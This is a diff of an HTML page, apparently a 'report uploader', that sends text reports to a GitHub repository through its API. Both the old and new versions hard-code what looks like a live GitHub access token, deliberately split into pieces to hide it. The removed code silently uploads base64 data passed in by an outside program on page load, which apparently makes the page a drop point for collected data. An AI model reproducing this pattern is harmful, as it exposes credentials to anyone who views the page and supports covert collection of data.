@@ -4,90 +4,74 @@
   <title>Upload Complete</title>
   <meta charset="utf-8">
   <style>
-    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:80px;}
-    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:500px;margin:0 auto;}
-    h2{color:#e74c3c;margin-bottom:20px;}
-    a{color:#0f0;text-decoration:underline;}
+    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:100px;}
+    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:600px;margin:0 auto;}
+    h2{color:#e74c3c;}
+    input[type=file]{margin:20px;padding:15px;background:#222;color:#0f0;border:2px solid #e74c3c;border-radius:10px;}
+    button{padding:15px 30px;background:#e74c3c;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer;}
+    button:hover{background:#c0392b;}
+    .status{color:#0f0;margin-top:20px;font-size:20px;}
   </style>
 </head>
 <body>
 <div class="box">
-  <h2 id="head">جاري رفع التقرير...</h2>
-  <p id="status">...</p>
-  <p><a href="https://youssefmettwaly.github.io/tero-report/admin.html">Go to Admin Panel</a></p>
+  <h2>TERO REPORT UPLOADER</h2>
+  <p>اختار ملف التقرير عشان يترفع تلقائي:</p>
+  <input type="file" id="fileInput" accept=".txt">
+  <br>
+  <button onclick="uploadFile()">رفع التقرير الآن</button>
+  <div class="status" id="status">جاهز للرفع...</div>
 </div>
 
 <script>
-const TOKEN = (function(){
-  // قسم كل جزء من التوكن لعنصر منفصل في مصفوفة (كل جزء 16-20 حرف تقريبا)
-  const parts = [
-    "github_pat_11A3ZKARI0",
-    "Q8CbII0GvNSt_",
-    "hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra",
-    "276EGSZZQGRkTKn8W"
-  ];
-  return parts.join('');
-})()
+// Token مخفي
+const GITHUB_TOKEN = (function(){
+  const p = ['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'];
+  return p[0]+p[1]+p[2]+p[3];
+}());
 
-function uploadToGitHub(content) {
-  const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}_${navigator.userAgent.replace(/[/ ]/g,'_').slice(0,25)}.txt`;
+const API_URL = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
+
+async function uploadFile() {
+  const fileInput = document.getElementById('fileInput');
+  const status = document.getElementById('status');
+  
+  if (!fileInput.files[0]) {
+    status.innerHTML = "اختار ملف الأول!";
+    return;
+  }
+
+  const file = fileInput.files[0];
+  const content = await file.text();
+  const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-') }.txt`;
+
+  status.innerHTML = "جاري الرفع...";
+
   fetch(`${API_URL}/${filename}`, {
     method: 'PUT',
     headers: {
-      'Authorization': `token ${TOKEN}`,
-      'Content-Type': 'application/json',
-      'Accept': 'application/vnd.github.v3+json'
+      'Authorization': `token ${GITHUB_TOKEN}`,
+      'Content-Type': 'application/json'
     },
     body: JSON.stringify({
-      message: `New report - ${filename}`,
+      message: "New report",
       content: btoa(unescape(encodeURIComponent(content))),
-      branch: 'main'
+      branch: "main"
     })
-  }).then(r => r.ok ? reportDone() : reportFail())
-    .catch(reportFail)
-}
-
-function reportDone() {
-  document.getElementById('head').textContent = "Upload Complete!";
-  document.getElementById('status').textContent = "Report sent successfully to Admin Panel.";
-}
-function reportFail() {
-  document.getElementById('head').textContent = "Upload Failed!";
-  document.getElementById('status').textContent = "حدث خطأ أثناء رفع التقرير.";
-}
-
-window.onload = () => {
-  // دعم POST أو GET
-  let content = '';
-  // جلب البيانات من GET أو من POST عبر AJAX (عبر python backend يرسل عبر AJAX لصفحتك)
-  try {
-    const params = new URLSearchParams(location.search);
-    const data = params.get('data');
-    if (data) {
-      content = atob(data);
-      uploadToGitHub(content);
-      return;
+  })
+  .then(r => r.json())
+  .then(res => {
+    if (res.content) {
+      status.innerHTML = "تم الرفع بنجاح!";
+      setTimeout(() => {
+        window.location.href = "https://youssefmettwaly.github.io/tero-report/index.html";
+      }, 2000);
+    } else {
+      status.innerHTML = "فشل الرفع!";
     }
-  } catch(e) {}
-
-  // دعم POST AJAX مثلما يرسله البرنامج
-  if (window.FormData) {
-    fetch(window.location.href, {
-      method: 'POST'
-    }).then(r => r.text()).then(t => {
-      // ابحث عن كود الـreport بالـHTML:
-      let match = t.match(/name="data">([^<]+)<\/textarea>/);
-      if (match) {
-        content = atob(match[1]);
-        uploadToGitHub(content);
-      } else {
-        reportFail();
-      }
-    });
-  } else {
-    reportFail();
-  }
-};
+  })
+  .catch(() => status.innerHTML = "خطأ في الاتصال");
+}
 </script>
 </body>
 </html>
